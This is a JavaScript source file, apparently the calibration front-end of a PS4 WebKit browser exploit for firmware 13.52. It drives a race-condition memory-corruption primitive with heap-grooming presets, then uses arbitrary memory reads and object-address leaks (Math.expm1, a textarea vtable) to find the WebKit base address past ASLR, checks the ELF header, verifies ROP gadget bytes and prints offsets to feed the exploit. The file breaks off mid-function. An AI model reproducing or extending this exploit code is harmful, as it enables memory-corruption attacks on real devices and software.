import { int64 } from "./int64.js";
import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";

const params = new URLSearchParams(location.search);
const lines = [];
let busy = false;
let ready = false;
let exploit = null;
let carrierRef = null;
let nativeFn = null;
let vtablePtr = null;
let tableOff = null;
let calibrated = null;
let manualBase = null;
let raceAttempt = 0;
let lengthMissStreak = 0;

const LOG_MAX = 300;
const CAL_ALIGN_STEP = 0x4000;
const ELF_MAGIC = 0x464c457f;
/** 13.52 retail test anchor — assumed correct unless cal proves otherwise */
const ASSUMED_EXPM1 = parseInt(
    (params.get("expm1") || "2582880").replace(/^0x/i, ""),
    16
);
const BAD_READ_MAGICS = new Set([0, 0xffffffff, 0xcccccccc, 0xcdcdcdcd, 0xdeadbeef]);
const FIND_BASE_MAX_STEPS = parseInt(params.get("backmax") || "2048", 10);
/** 0 = run full vtable walk as fast as possible; yield to UI every N steps */
const WALK_YIELD_EVERY = parseInt(params.get("walkyield") || "512", 10);
const WALK_LOG_EVERY = parseInt(params.get("walklog") || "128", 10);
/** auto vtable walk after Start unless ?vtable=0 */
const AUTO_VTABLE_WALK = params.get("vtable") !== "0";
const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|CAL-|GADGET|ELF|BASES|LK-|PASTE|HINT-GROOM/i;

const GADGET_CHECKS = [
    ["POP_RDI", "wk_POP_RDI_RET", [0x5f, 0xc3]],
    ["POP_RSI", "wk_POP_RSI_RET", [0x5e, 0xc3]],
    ["POP_RDX", "wk_POP_RDX_RET", [0x5a, 0xc3]],
    ["POP_RCX", "wk_POP_RCX_RET", [0x59, 0xc3]],
    ["POP_RAX", "wk_POP_RAX_RET", [0x58, 0xc3]],
    ["POP_R8", "wk_POP_R8_RET", [null, 0x58, 0xc3]],
    ["POP_R9", "wk_POP_R9_RET", [null, 0x59, 0xc3]],
    ["LEAVE", "wk_LEAVE_RET", [0xc9, 0xc3]],
];

const GROOM_PRESETS = {
    default: { g: [] },
    lite: { g: ["drain:256", "drainsz:32768", "slab:2097152"] },
    "384": { g: ["drain:384", "drainsz:32768", "slab:2097152"] },
    "512": { g: ["drain:512", "drainsz:32768", "slab:2097152"] },
    max: {
        g: [
            "drain:512", "drainsz:65536", "slab:4194304",
            "bfly:528384", "early:458752", "guard:589824",
            "pred:524288", "final:524288",
        ],
    },
};

function currentGroomKey() {
    const gs = params.getAll("g");
    if (gs.length === 0) return "default";
    for (const key of Object.keys(GROOM_PRESETS)) {
        if (key === "default") continue;
        const preset = GROOM_PRESETS[key];
        if (preset.g.length !== gs.length) continue;
        let match = true;
        for (let i = 0; i < preset.g.length; i++) {
            if (gs[i] !== preset.g[i]) { match = false; break; }
        }
        if (match) return key;
    }
    return "custom";
}

function groomBootLine() {
    const key = currentGroomKey();
    const gs = params.getAll("g");
    if (key === "custom") return "groom=custom (" + gs.join(", ") + ")";
    if (key === "default") return "groom=default (core 384 drain)";
    return "groom=" + key;
}

function reloadWithGroomPreset(key) {
    const preset = GROOM_PRESETS[key];
    if (!preset) return;
    const url = new URL(location.href);
    url.searchParams.delete("g");
    url.searchParams.delete("slots");
    for (let i = 0; i < preset.g.length; i++)
        url.searchParams.append("g", preset.g[i]);
    location.href = url.toString();
}

function wireGroomBar() {
    const key = currentGroomKey();
    const nodes = document.querySelectorAll("[data-groom]");
    for (let i = 0; i < nodes.length; i++) {
        const el = nodes[i];
        el.classList.toggle("active", el.getAttribute("data-groom") === key);
        el.addEventListener("click", function () {
            if (busy) return;
            const k = el.getAttribute("data-groom");
            if (k) reloadWithGroomPreset(k);
        });
    }
}

let outEl, stateEl, resultEl, nativeFnEl, baseEl, expm1In, baseIn;
let btnStart, btnLite, btnWide, btnVerify, btnSetExpm1, btnSetBase, btnAssume, btnFindBase, btnFindBaseVtable, btnVerify2, btnSetExpm12, btnSetBase2, btnProbe, btnCopy, btnClear;
let calBarEl;
let scanMode = "lite";
let scanIndex = 0;
let scanList = [];
let verifyGadgetOk = 0;

const SS_CANDIDATE = "wk-cal-candidate";
const SS_MANUAL_BASE = "wk-manual-base";
const SS_VSTEP = "wk-vstep";
const SS_VGAD_OK = "wk-vgad-ok";
const SS_LK_STEP = "wk-cal-lk-step";
const SS_LK_ERROR = "wk-cal-lk-errorFn";
const SS_LK_W0 = "wk-cal-lk-w0";

function $(id) { return document.getElementById(id); }

function mark(tag, detail) {
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    lines.push(line);
    if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
    if (outEl) {
        outEl.textContent = lines.join("\n");
        outEl.scrollTop = outEl.scrollHeight;
    }
}

function state(msg, cls) {
    if (!stateEl) return;
    stateEl.textContent = msg;
    stateEl.className = cls || "";
}

function setCalButton(el, on) {
    if (!el) return;
    el.disabled = !on;
    el.style.display = "inline-block";
    el.style.visibility = "visible";
}

function setUi() {
    const calReady = ready && nativeFn && !busy;
    if (btnStart) btnStart.disabled = busy || ready;
    setCalButton(btnLite, calReady);
    setCalButton(btnWide, calReady);
    setCalButton(btnVerify, calReady);
    setCalButton(btnSetExpm1, calReady);
    setCalButton(btnSetBase, calReady);
    setCalButton(btnAssume, calReady);
    setCalButton(btnVerify2, calReady);
    setCalButton(btnSetExpm12, calReady);
    setCalButton(btnSetBase2, calReady);
    setCalButton(btnProbe, calReady);
    setCalButton(btnFindBase, calReady);
    setCalButton(btnFindBaseVtable, ready && !busy);
    if (btnCopy) btnCopy.disabled = busy || !calibrated;
    if (expm1In) expm1In.disabled = busy || !(ready && nativeFn);
    if (baseIn) baseIn.disabled = busy || !(ready && nativeFn);
    if (calBarEl) {
        calBarEl.style.display = "flex";
        if (ready && nativeFn)
            calBarEl.style.borderColor = "#3a6b54";
    }
}

function preCalTrim() {
    if (lines.length > 6) {
        lines.splice(0, lines.length - 6);
        if (outEl) outEl.textContent = lines.join("\n");
    }
}

function clearVerifyProgress() {
    verifyGadgetOk = 0;
    try {
        sessionStorage.removeItem(SS_VSTEP);
        sessionStorage.removeItem(SS_VGAD_OK);
        sessionStorage.removeItem(SS_LK_STEP);
        sessionStorage.removeItem(SS_LK_ERROR);
        sessionStorage.removeItem(SS_LK_W0);
    } catch (_) { }
}

function clearLkProgress() {
    try {
        sessionStorage.removeItem(SS_LK_STEP);
        sessionStorage.removeItem(SS_LK_ERROR);
        sessionStorage.removeItem(SS_LK_W0);
    } catch (_) { }
}

const SS_PROBE_I = "wk-cal-probe-i";
const SS_PROBE_LIST = "wk-cal-probe-n";
const SS_FIND_BASE_I = "wk-cal-findbase-i";
const SS_VTABLE_FIND_I = "wk-cal-vtable-find-i";
const SS_VTABLE_PTR = "wk-vtablePtr";

function ptrNum(fn) {
    return (fn.hi >>> 0) * 0x100000000 + (fn.low >>> 0);
}

function ptrFromNum(n) {
    if (!(n >= 0)) return null;
    return new int64(n >>> 0, Math.floor(n / 0x100000000));
}

function ptrResidue(fn) {
    return ptrNum(fn) & (CAL_ALIGN_STEP - 1);
}

function baseFromDelta(fn, delta) {
    if (!fn || !(delta > 0)) return null;
    const n = ptrNum(fn) - delta;
    if (n <= 0) return null;
    return ptrFromNum(n);
}

function fmtMagic(m) {
    if (m == null) return "read-failed";
    return "0x" + (m >>> 0).toString(16);
}

function activeDelta() {
    const typed = parseExpm1(expm1In && expm1In.value);
    if (typed > 0) return typed;
    if (manualBase && nativeFn) {
        const d = ptrNum(nativeFn) - ptrNum(manualBase);
        if (d > 0) return d >>> 0;
    }
    try {
        const c = parseInt(sessionStorage.getItem(SS_CANDIDATE) || "0", 16);
        return c > 0 ? c : 0;
    } catch (_) { return 0; }
}

function activeBase() {
    if (manualBase) return manualBase;
    const delta = activeDelta();
    if (!nativeFn || !(delta > 0)) return null;
    return baseFromDelta(nativeFn, delta);
}

function impliedExpm1FromBase(fn, base) {
    if (!fn || !base) return 0;
    const d = ptrNum(fn) - ptrNum(base);
    return d > 0 ? (d >>> 0) : 0;
}

function parseAddr(str) {
    if (!str) return null;
    let s = String(str).trim().toLowerCase().replace(/^0x/, "");
    if (!/^[0-9a-f]+$/.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16), 0);
    // PS4 pointers are often 9–11 hex digits — pad so hi/lo split is correct
    if (s.length < 16) s = s.padStart(16, "0");
    return new int64(parseInt(s.slice(-8), 16), parseInt(s.slice(0, -8), 16));
}

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function read1p(p, addr) {
    if (!addr) return null;
    try { return p.read1(addr); } catch (_) { return null; }
}

function alignedWebkitBase(v) {
    return v && v.hi > 0 && (v.low & 0x3fff) === 0;
}

function liteHintDeltas(off, fn) {
    const hint = off.wk_expm1_builtin;
    if (hint == null) return [];
    const k = liteSpanK();
    const residue = ptrResidue(fn);
    const out = [];
    for (let i = -k; i <= k; i++) {
        const d = (hint + i * CAL_ALIGN_STEP) >>> 0;
        if ((d & 0x3fff) === residue) out.push(d);
    }
    return out;
}

function probeAlignedDeltas(fn) {
    const minD = parseInt(params.get("min") || "0x1e00000", 16);
    const maxD = parseInt(params.get("max") || "0x2c00000", 16);
    const residue = ptrResidue(fn);
    const out = [];
    let d = (minD & ~(CAL_ALIGN_STEP - 1)) | residue;
    if (d < minD) d += CAL_ALIGN_STEP;
    while (d <= maxD) {
        out.push(d >>> 0);
        d += CAL_ALIGN_STEP;
    }
    return out;
}

function wideAlignedDeltas(fn) {
    return probeAlignedDeltas(fn);
}

function liteSpanK() {
    const fromUrl = parseInt(params.get("litek") || "", 10);
    if (fromUrl > 0) return fromUrl;
    return 8;
}

function isBadRead(magic) {
    return magic == null || BAD_READ_MAGICS.has(magic >>> 0);
}

function looksLikeNativeCode(magic) {
    if (isBadRead(magic)) return false;
    const b0 = magic & 0xff;
    const b1 = (magic >>> 8) & 0xff;
    if (b0 === 0x7f && b1 === 0x45) return false;
    return b0 === 0x55 || b0 === 0x48 || b0 === 0x41 || b0 === 0x89 || b0 === 0xe9;
}

function captureNativeFn(p, off) {
    const mOff = off.wk_JSFunction_m_function || 0x28;
    const cell = p.leakval(Math.expm1);
    mark("CAL-CELL", String(cell));
    const paths = [];

    const mid = read8p(p, cell.add32(0x18));
    if (mid) {
        for (const o of [mOff, 0x20, 0x28, 0x30, 0x38, 0x8, 0x10, 0x0]) {
            const fn = read8p(p, mid.add32(o));
            if (fn && fn.hi > 0)
                paths.push({ label: "cell+0x18 -> +0x" + o.toString(16), fn });
        }
    }
    for (let o = 0x8; o <= 0x30; o += 8) {
        const q = read8p(p, cell.add32(o));
        if (q && q.hi > 0)
            paths.push({ label: "cell+0x" + o.toString(16), fn: q });
    }

    let fallback = null;
    for (let i = 0; i < paths.length; i++) {
        const path = paths[i];
        const code = read4p(p, path.fn);
        mark("CAL-PATH-TRY", path.label + " fn=" + path.fn + " code=" + fmtMagic(code));
        if (looksLikeNativeCode(code)) {
            mark("CAL-NATIVEFN-PATH", path.label);
            mark("CAL-CODE0", "read4@nativeFn=" + fmtMagic(code));
            try { sessionStorage.setItem("wk-nativeFn", String(path.fn)); } catch (_) { }
            return path.fn;
        }
        if (!isBadRead(code) && !fallback)
            fallback = path.fn;
    }

    if (fallback) {
        mark("CAL-WARN", "nativeFn using weak fallback " + fallback);
        try { sessionStorage.setItem("wk-nativeFn", String(fallback)); } catch (_) { }
        return fallback;
    }

    if (paths.length > 0 && paths[0].fn) {
        mark("CAL-WARN", "no path looked like code — using first path");
        return paths[0].fn;
    }
    return null;
}

function findBaseWalkAddr(fn, step) {
    const fnNum = ptrNum(fn);
    const page = fnNum & ~(CAL_ALIGN_STEP - 1);
    const addrNum = page - step * CAL_ALIGN_STEP;
    if (addrNum <= 0x100000) return null;
    return ptrFromNum(addrNum);
}

function addrFromNumber(n) {
    if (!(n > 0) || !Number.isFinite(n)) return null;
    return ptrFromNum(Math.trunc(n));
}

function loadVtableOverride() {
    try {
        const raw = sessionStorage.getItem(SS_VTABLE_PTR);
        return raw ? parseAddr(raw) : null;
    } catch (_) { return null; }
}

function captureTextareaVtable(p, carrier) {
    const cells = [];
    if (carrier && carrier.textarea) {
        try {
            const leaked = p.leakval(carrier.textarea);
            if (leaked) cells.push({ label: "leakval(textarea)", cell: leaked });
        } catch (_) { }
    }
    if (carrier && carrier.textareaAddress > 0 && Number.isFinite(carrier.textareaAddress)) {
        const held = addrFromNumber(carrier.textareaAddress);
        if (held) cells.push({ label: "carrier.textareaAddress", cell: held });
    }
    if (cells.length === 0) {
        mark("VTABLE-FAIL", "no textarea cell — re-run Start");
        return null;
    }

    for (let ci = 0; ci < cells.length; ci++) {
        const path = cells[ci];
        mark("VTABLE-PATH", path.label + " cell=" + path.cell);
        for (let io = 0; io < 3; io++) {
            const implOff = [0x18, 0x10, 0x20][io];
            const webcore = read8p(p, path.cell.add32(implOff));
            if (!webcore || webcore.hi === 0) continue;
            mark("VTABLE-TRY", "webcore+0x" + implOff.toString(16) + "=" + webcore);
            for (let vo = 0; vo < 2; vo++) {
                const vtOff = vo === 0 ? 0x0 : 0x8;
                const vt = read8p(p, webcore.add32(vtOff));
                if (!vt || vt.hi === 0) continue;
                const entry0 = read4p(p, vt);
                if (isBadRead(entry0)) continue;
                mark("VTABLE-OK", path.label + " impl+0x" + implOff.toString(16)
                    + " vtable=" + vt + " entry0=" + fmtMagic(entry0));
                return { vtable: vt, webcore, jsCell: path.cell, implOff, vtOff };
            }
        }
    }

    mark("VTABLE-FAIL", "no vtable — check textarea paths above");
    return null;
}

function ensureVtablePtr(p) {
    if (vtablePtr) return vtablePtr;
    vtablePtr = loadVtableOverride();
    if (vtablePtr) {
        mark("VTABLE-LOAD", "cached " + vtablePtr);
        return vtablePtr;
    }
    if (!carrierRef) {
        mark("VTABLE-FAIL", "no carrier — re-run Start");
        return null;
    }
    const hit = captureTextareaVtable(p, carrierRef);
    if (!hit) return null;
    vtablePtr = hit.vtable;
    try { sessionStorage.setItem(SS_VTABLE_PTR, String(vtablePtr)); } catch (_) { }
    return vtablePtr;
}

function suggestedExpm1(fn, off) {
    const hint = off && off.wk_expm1_builtin;
    if (!fn || hint == null) return 0;
    const residue = ptrResidue(fn);
    for (let ki = 0; ki < 7; ki++) {
        const k = [-1, 0, 1, -2, 2, -3, 3][ki];
        const d = (hint + k * CAL_ALIGN_STEP) >>> 0;
        if ((d & 0x3fff) === residue) return d;
    }
    return 0;
}

function prefillSuggestedExpm1(fn, off) {
    const guess = ASSUMED_EXPM1 > 0 ? ASSUMED_EXPM1 : suggestedExpm1(fn, off);
    if (!(guess > 0)) return 0;
    if (expm1In) expm1In.value = guess.toString(16);
    mark("CAL-GUESS", "expm1=0x" + guess.toString(16) + " base=" + baseFromDelta(fn, guess)
        + " (assumed — tap Assume to skip verify, or Verify step to check)");
    updateResultPanel();
    return guess;
}

function loadNativeFnOverride() {
    const raw = params.get("nativefn") || sessionStorage.getItem("wk-nativeFn");
    return parseAddr(raw);
}

function tryElfOnce(p, fn, delta) {
    if (!(delta > 0)) return null;
    const base = baseFromDelta(fn, delta);
    if (!base || !alignedWebkitBase(base)) return null;
    const magic = read4p(p, base);
    if (magic !== ELF_MAGIC) return null;
    return { delta, base };
}

function applyBaseFound(base, via) {
    const delta = nativeFn ? impliedExpm1FromBase(nativeFn, base) : 0;
    try {
        sessionStorage.removeItem(SS_PROBE_I);
        sessionStorage.removeItem(SS_PROBE_LIST);
        sessionStorage.removeItem(SS_FIND_BASE_I);
        sessionStorage.removeItem(SS_VTABLE_FIND_I);
        if (delta > 0) sessionStorage.setItem(SS_CANDIDATE, String(delta));
        sessionStorage.setItem("wk-webkitBase", String(base));
    } catch (_) { }
    manualBase = base;
    try { sessionStorage.setItem(SS_MANUAL_BASE, String(base)); } catch (_) { }
    if (delta > 0 && expm1In) expm1In.value = delta.toString(16);
    if (baseIn) baseIn.value = ptrNum(base).toString(16);
    clearVerifyProgress();
    updateResultPanel();
    mark("CAL-ELF-HIT", via + " base=" + base
        + (delta > 0 ? " expm1=0x" + delta.toString(16) : " (expm1 n/a)"));
}

function applyElfHit(delta, base) {
    applyBaseFound(base, delta > 0 ? "expm1=0x" + delta.toString(16) : "walk");
}

function loadManualBaseOverride() {
    const raw = params.get("base") || sessionStorage.getItem(SS_MANUAL_BASE);
    return parseAddr(raw);
}

function updateResultPanel() {
    if (nativeFnEl) nativeFnEl.textContent = nativeFn ? String(nativeFn) : "—";
    if (baseEl) {
        if (calibrated && calibrated.webkitBase)
            baseEl.textContent = String(calibrated.webkitBase)
                + (manualBase ? " (manual override was used)" : "");
        else if (manualBase)
            baseEl.textContent = String(manualBase) + " (manual)";
        else if (baseIn && baseIn.value.trim()) {
            const typed = parseAddr(baseIn.value);
            baseEl.textContent = typed ? String(typed) + " (typed — tap Set base)" : "—";
        } else if (nativeFn && expm1In && expm1In.value.trim()) {
            const b = baseFromDelta(nativeFn, parseExpm1(expm1In.value));
            baseEl.textContent = b ? String(b) + " (computed)" : "—";
        } else
            baseEl.textContent = "—";
    }
    if (resultEl) {
        if (!calibrated) {
            resultEl.textContent = "no verified expm1 yet";
            return;
        }
        const elfLine = calibrated.assumed
            ? (calibrated.elf
                ? "ELF peek=ok (assumed path)"
                : "ELF peek=FAIL got="
                    + (calibrated.elfPeek == null ? "read-failed" : fmtMagic(calibrated.elfPeek))
                    + " — base likely wrong")
            : (calibrated.elf ? "ELF=ok" : "ELF=bad");
        resultEl.textContent = [
            (calibrated.assumed ? "ASSUMED (not fully verified)\n" : ""),
            "nativeFn=" + (nativeFn ? String(nativeFn) : "?"),
            "expm1=0x" + calibrated.delta.toString(16),
            "webkit=" + calibrated.webkitBase,
            calibrated.libkernelBase ? "libkernel=" + calibrated.libkernelBase : "libkernel=(IAT not verified)",
            "gadgets=" + calibrated.gadgetOk + "/" + calibrated.gadgetTotal,
            elfLine,
        ].join("\n");
    }
}

function parseExpm1(str) {
    const s = String(str || "").trim().replace(/^0x/i, "");
    const n = parseInt(s, 16);
    return n > 0 ? n : 0;
}

function checkGadgetBytes(p, base, rva, pat) {
    if (rva == null) return false;
    const a = base.add32(rva);
    for (let i = 0; i < pat.length; i++) {
        if (pat[i] === null) continue;
        const b = read1p(p, a.add32(i));
        if (b == null || b !== pat[i]) return false;
    }
    return true;
}

function applyCalibration(delta, base, libkernelBase, gadgetOk, opts) {
    const assumed = opts && opts.assumed;
    const useDelta = delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base);
    if (!(useDelta > 0)) {
        mark("CAL-FAIL", "no expm1 delta for PASTE-OFFSETS");
        return;
    }
    const result = {
        delta: useDelta,
        webkitBase: base,
        libkernelBase: libkernelBase || null,
        elf: assumed ? (opts.elfPeek === ELF_MAGIC) : true,
        elfPeek: assumed ? opts.elfPeek : ELF_MAGIC,
        gadgetOk: gadgetOk || 0,
        gadgetTotal: GADGET_CHECKS.length,
        ok: true,
        assumed: !!assumed,
    };
    calibrated = result;
    clearVerifyProgress();
    clearLkProgress();
    const live = {
        fw_status: assumed
            ? "assumed expm1 on hardware — not ELF/gadget verified"
            : "calibrated on hardware (index_cal.html)",
        wk_JSFunction_m_function: tableOff.wk_JSFunction_m_function || 0x28,
        wk_expm1_builtin: result.delta,
        wk_ArrayBuffer_m_impl: tableOff.wk_ArrayBuffer_m_impl,
        wk_ArrayBuffer_m_contents_m_data: tableOff.wk_ArrayBuffer_m_contents_m_data,
    };
    if (tableOff.wk___imp___error) live.wk___imp___error = tableOff.wk___imp___error;
    if (tableOff.k__error) live.k__error = tableOff.k__error;
    for (let gi = 0; gi < GADGET_CHECKS.length; gi++) {
        const key = GADGET_CHECKS[gi][1];
        if (tableOff[key] != null) live[key] = tableOff[key];
    }

    try {
        sessionStorage.setItem("wk-calibrated", JSON.stringify(live));
        sessionStorage.setItem("wk-webkitBase", String(result.webkitBase));
        sessionStorage.removeItem("wk-cal-lite-i");
        sessionStorage.removeItem("wk-cal-wide-i");
    } catch (_) { }

    mark("CAL-OK", (assumed ? "ASSUMED " : "")
        + "expm1=0x" + result.delta.toString(16) + " base=" + result.webkitBase);
    mark("BASES", "webkit=" + result.webkitBase
        + (result.libkernelBase ? " libkernel=" + result.libkernelBase : ""));
    mark("PASTE-OFFSETS", JSON.stringify(live, null, 2));
    if (expm1In) expm1In.value = result.delta.toString(16);
    updateResultPanel();
    state("CAL-OK — expm1 verified", "ok");
    setUi();
}

function rebuildScanList(mode) {
    scanMode = mode;
    if (mode === "lite") scanList = liteHintDeltas(tableOff, nativeFn);
    else scanList = wideAlignedDeltas(nativeFn);
    const key = mode === "lite" ? "wk-cal-lite-i" : "wk-cal-wide-i";
    try { scanIndex = parseInt(sessionStorage.getItem(key) || "0", 10) || 0; }
    catch (_) { scanIndex = 0; }
    mark("SCAN-LIST", mode + " candidates=" + scanList.length + " next=" + (scanIndex + 1));
    if (scanList.length > 0 && scanIndex < 5) {
        mark("SCAN-PEEK", scanList.slice(scanIndex, scanIndex + 5)
            .map(d => "0x" + d.toString(16)).join(" "));
    }
}

function logNativeFnInfo(fn) {
    const residue = ptrResidue(fn);
    mark("CAL-NATIVEFN", String(fn) + " (ptr=0x" + ptrNum(fn).toString(16) + ")");
    mark("CAL-RESIDUE", "ptr&0x3fff=0x" + residue.toString(16));
    mark("CAL-FORMULA", "webkitBase = nativeFn - expm1");
    const code0 = window.p ? read4p(window.p, fn) : null;
    mark("CAL-CODE0", "read4@nativeFn=" + fmtMagic(code0) + " (sanity — not ELF)");
    if (tableOff && tableOff.wk_expm1_builtin != null) {
        const hint = tableOff.wk_expm1_builtin;
        const hintBase = baseFromDelta(fn, hint);
        mark("CAL-HINT", "table expm1=0x" + hint.toString(16)
            + " → base=" + hintBase + (hintBase && alignedWebkitBase(hintBase) ? "" : " (misaligned)"));
    }
}

async function loadExploit() {
    if (exploit) return exploit;
    mark("LOAD", "core.js + mem.js");
    const core = await import("./core.js");
    exploit = { establishPrimitive: core.establishPrimitive, installWindowP };
    return exploit;
}

function attemptCap() {
    if (!params.has("attempts")) return 0;
    const n = parseInt(params.get("attempts"), 10);
    return n > 0 ? n : 0;
}

function onRaceEvent(tag, detail) {
    if (!CORE_LOG.test(tag)) return;
    mark(tag, detail || "");

    if (tag === "ATTEMPT-START") {
        raceAttempt++;
        state("race attempt " + raceAttempt + "…", "warn");
        if (raceAttempt === 15 || raceAttempt === 30 || raceAttempt === 50)
            mark("HINT-GROOM", "still missing? close browser fully → reload → tap 512 or max groom");
    }

    if (/COMPOSITION-LENGTH-MISS|SSV-PLACEMENT-MISS|ZERO-HEADER-MISS/.test(tag)) {
        lengthMissStreak++;
        if (lengthMissStreak === 8 || lengthMissStreak === 20)
            mark("HINT-GROOM", "COMPOSITION-LENGTH-MISS = race lost — tap 512 drain or max groom above, close browser, reload");
    }

    if (tag === "READ-PRIMITIVE-PASS" || tag === "PRIMITIVE-OK")
        lengthMissStreak = 0;
}

async function establishOnce(establishPrimitive) {
    raceAttempt = 0;
    lengthMissStreak = 0;
    const cap = attemptCap();
    mark("ATTEMPTS", cap > 0 ? String(cap) + " per page load" : "unlimited (single run)");
    mark("NOTE", "close browser fully before Start if prior OOM or long retry session");

    return establishPrimitive({
        maxAttempts: cap,
        onEvent: (t, d, a) => onRaceEvent(t, (a != null ? "[" + a + "] " : "") + (d || ""))
    });
}

async function runStart() {
    if (busy || ready) return;
    busy = true;
    setUi();
    lines.length = 0;
    calibrated = null;

    const detected = offsetsFor(navigator.userAgent);
    tableOff = (offsetsForKey(detected.key || "13.52").off) || offsetsForKey("13.52").off;
    mark("UA-FW", detected.key || "unknown");
    mark("GOAL", "find wk_expm1_builtin for 13.52 retail");
    state("getting primitive…", "warn");

    try {
        const { establishPrimitive, installWindowP: installP } = await loadExploit();
        let carrier;
        try {
            carrier = await establishOnce(establishPrimitive);
        } catch (err) {
            if (/gave up/i.test(String(err.message))) {
                mark("HINT-GROOM", "race lost — close browser fully, reload, tap 512 or max groom, Start again");
            }
            throw err;
        }
        installP(carrier, { promote: params.get("promote") === "1" });
        carrierRef = carrier;
        vtablePtr = null;
        const p = window.p;
        if (!p) throw new Error("window.p missing");

        mark("PRIMITIVE-OK", "");
        mark("PAIR-STATUS", "state=" + pairStatus.state);

        nativeFn = captureNativeFn(p, tableOff);
        if (!nativeFn) nativeFn = loadNativeFnOverride();
        if (!nativeFn) throw new Error("nativeFn capture failed");

        scanIndex = 0;
        scanList = [];
        try {
            sessionStorage.removeItem(SS_PROBE_I);
            sessionStorage.removeItem(SS_PROBE_LIST);
            sessionStorage.removeItem(SS_FIND_BASE_I);
            sessionStorage.removeItem(SS_VTABLE_FIND_I);
            sessionStorage.removeItem(SS_VTABLE_PTR);
        } catch (_) { }

        ready = true;
        logNativeFnInfo(nativeFn);
        manualBase = loadManualBaseOverride();
        if (manualBase) {
            if (baseIn) baseIn.value = ptrNum(manualBase).toString(16);
            mark("CAL-BASE-LOAD", "manual base=" + manualBase + " (expm1 field unchanged)");
        }

        if (params.get("trust") === "1" || params.get("assume") === "1") {
            runAssumeTest(true);
            return;
        }

        mark("HINT-CAL", "vtable base walk runs automatically after Start");
        prefillSuggestedExpm1(nativeFn, tableOff);

        const pre = parseExpm1(params.get("expm1"));
        if (pre > 0 && expm1In) expm1In.value = pre.toString(16);

        updateResultPanel();

        if (AUTO_VTABLE_WALK && !manualBase) {
            mark("AUTO", "2e vtable walk starting…");
            await walkVtableForBase();
        } else {
            mark("NEXT", "tap 2e to re-run vtable walk OR Verify step");
            state("primitive OK — vtable walk skipped", "ok");
        }
        try { if (expm1In) expm1In.focus(); } catch (_) { }
        if (calBarEl && calBarEl.scrollIntoView)
            try { calBarEl.scrollIntoView(false); } catch (_) { }
    } catch (err) {
        state("failed: " + err.message, "bad");
        mark("ERROR", err.stack || err.message);
    } finally {
        busy = false;
        setUi();
    }
}

async function runScanStep(mode) {
    if (busy || !ready || !window.p || !nativeFn) return;
    busy = true;
    setUi();
    preCalTrim();

    if (scanMode !== mode || scanList.length === 0) rebuildScanList(mode);
    const key = mode === "lite" ? "wk-cal-lite-i" : "wk-cal-wide-i";

    try {
        if (scanIndex >= scanList.length) {
            mark("CAL-FAIL", mode + " scan exhausted (" + scanList.length + " tries)");
            const guess = suggestedExpm1(nativeFn, tableOff);
            if (guess > 0) {
                if (expm1In) expm1In.value = guess.toString(16);
                mark("CAL-GUESS", "expm1=0x" + guess.toString(16) + " base="
                    + nativeFn.sub32(guess));
            }
            mark("HINT", "scan miss is OK on 13.52 — tap Set expm1 (0 reads), skip lite scan");
            mark("HINT", "then Verify step tap 1 for CAL-ELF-OK (optional)");
            state("scan done — use Set expm1", "warn");
            return;
        }

        const delta = scanList[scanIndex];
        mark("CAL-TRY", (scanIndex + 1) + "/" + scanList.length
            + " 0x" + delta.toString(16) + " (1 read)");

        await new Promise(r => setTimeout(r, 64));

        const hit = tryElfOnce(window.p, nativeFn, delta);
        scanIndex++;
        try { sessionStorage.setItem(key, String(scanIndex)); } catch (_) { }

        if (!hit) {
            mark("ELF-MISS", "0x" + delta.toString(16));
            state(mode + " " + scanIndex + "/" + scanList.length + " — tap again", "warn");
            return;
        }

        try {
            sessionStorage.setItem(SS_CANDIDATE, String(hit.delta));
            sessionStorage.removeItem(key);
        } catch (_) { }
        clearVerifyProgress();
        applyElfHit(hit.delta, hit.base);
        mark("CAL-MORE", "tap Verify step (1 read/tap) OR Assume if skipping verify");
        state("ELF hit — Verify or Assume", "ok");
    } finally {
        busy = false;
        setUi();
    }
}

function runSetExpm1() {
    if (busy || !ready || !nativeFn) return;
    preCalTrim();
    const delta = parseExpm1(expm1In && expm1In.value);
    if (!(delta > 0)) {
        mark("CAL-FAIL", "bad expm1 hex");
        state("invalid expm1", "bad");
        return;
    }
    manualBase = null;
    try { sessionStorage.removeItem(SS_MANUAL_BASE); } catch (_) { }
    const base = nativeFn.sub32(delta);
    const base2 = baseFromDelta(nativeFn, delta);
    try { sessionStorage.setItem(SS_CANDIDATE, String(delta)); } catch (_) { }
    if (baseIn && base2) baseIn.value = ptrNum(base2).toString(16);
    clearVerifyProgress();
    updateResultPanel();
    mark("CAL-SET", "expm1=0x" + delta.toString(16) + " base=" + base2 + " (0 reads)");
    if (base2 && base && (base2.low !== base.low || base2.hi !== base.hi))
        mark("CAL-NOTE", "sub32 base=" + base + " ptr base=" + base2);
    mark("HINT", "tap Probe ELF if Verify step 1 fails on this delta");
    state("expm1 set (0 reads)", "ok");
}

function runSetBase() {
    if (busy || !ready || !nativeFn) return;
    preCalTrim();
    const base = parseAddr(baseIn && baseIn.value);
    if (!base) {
        mark("CAL-FAIL", "bad base hex — use e.g. 8325b0000 or 0x8325b0000");
        state("invalid base", "bad");
        return;
    }
    if (!alignedWebkitBase(base)) {
        mark("CAL-WARN", "base=" + base + " not 0x4000-aligned — verify anyway");
    }
    manualBase = base;
    try {
        sessionStorage.setItem(SS_MANUAL_BASE, String(base));
    } catch (_) { }

    clearVerifyProgress();
    updateResultPanel();
    mark("CAL-SET-BASE", "base=" + base + " (manual, 0 reads — expm1 unchanged)");
    mark("HINT", "tap Assume expm1 OR Verify step (uses this base if Set base was last)");
    state("base set (0 reads)", "ok");
}

function runAssumeTest(fromStart) {
    if (!fromStart) {
        if (busy || !ready || !nativeFn) return;
        preCalTrim();
    }
